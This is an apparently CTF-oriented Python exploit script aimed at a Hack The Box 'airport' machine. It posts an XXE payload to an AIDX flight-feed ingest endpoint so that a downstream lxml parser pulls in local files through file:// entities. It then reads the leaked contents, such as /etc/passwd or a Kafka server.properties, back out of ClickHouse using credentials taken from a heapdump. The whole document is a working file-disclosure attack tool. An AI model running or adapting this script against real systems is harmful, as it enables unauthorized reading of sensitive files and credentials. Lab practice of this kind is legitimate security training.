#!/usr/bin/env python3
"""In-band XXE through AIDX ingest → ClickHouse partner_feed.flightleg_json.

Downstream lxml resolves file:// into <Airline>. The ingest itself does
not parse XML and does not call out to tun0, so OOB HTTP/FTP listeners
stay silent. Read the expansion with a SELECT on a unique FlightNumber.

Usage:
  export CH_PASS=...
  python3 xxe_read.py --target 10.129.x.x --file /etc/passwd --flight P99
  python3 xxe_read.py --target 10.129.x.x \\
      --file /opt/kafka_2.13-4.3.1/config/server.properties --flight K1
"""
from __future__ import annotations

import argparse
import os
import sys
import time

import aidx_ingest
import ch_http

DEFAULT_CH = os.environ.get("CH_URL", "http://db.htb-airport.htb/")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--target", required=True, help="box IP")
    ap.add_argument("--file", required=True, dest="path", help="file:// path on the target")
    ap.add_argument("--flight", default=None, help="unique FlightNumber (default: unix suffix)")
    ap.add_argument("--ingest", help="override ingest URL")
    ap.add_argument("--ch-url", default=DEFAULT_CH)
    ap.add_argument("-u", "--user", default=os.environ.get("CH_USER", "svc_events"))
    ap.add_argument("-p", "--password", default=os.environ.get("CH_PASS", ""))
    ap.add_argument("--wait", type=float, default=6.0, help="seconds before SELECT")
    args = ap.parse_args()

    if not args.password:
        print("[-] set --password or CH_PASS (heapdump Hikari user)", file=sys.stderr)
        return 2

    flight = args.flight or f"P{int(time.time()) % 1000000}"
    url = args.ingest or f"http://{args.target}:8081/feeds/aidx"
    xml = aidx_ingest.build_xxe(args.path, flight).encode()

    print(f"[*] XXE file://{args.path}  flight={flight}", file=sys.stderr)
    code, resp = aidx_ingest.post(url, xml, 15)
    print(f"[*] ingest HTTP {code} {resp.strip()}", file=sys.stderr)
    if code not in (200, 202):
        return 1

    print(f"[*] waiting {args.wait:.0f}s for parser → CH", file=sys.stderr)
    time.sleep(args.wait)

    sql = (
        "SELECT flight_number, airline "
        "FROM partner_feed.flightleg_json "
        f"WHERE flight_number='{flight}'"
    )
    code, body = ch_http.query(args.ch_url, args.user, args.password, sql, 30)
    if code != 200:
        print(f"[-] CH HTTP {code}\n{body}", file=sys.stderr)
        print("[-] empty/error often means the file contained raw '&' or '<' after expansion", file=sys.stderr)
        return 1
    if not body.strip():
        print("[-] no row — wait longer, or the parse went to DLQ", file=sys.stderr)
        return 1
    sys.stdout.write(body if body.endswith("\n") else body + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
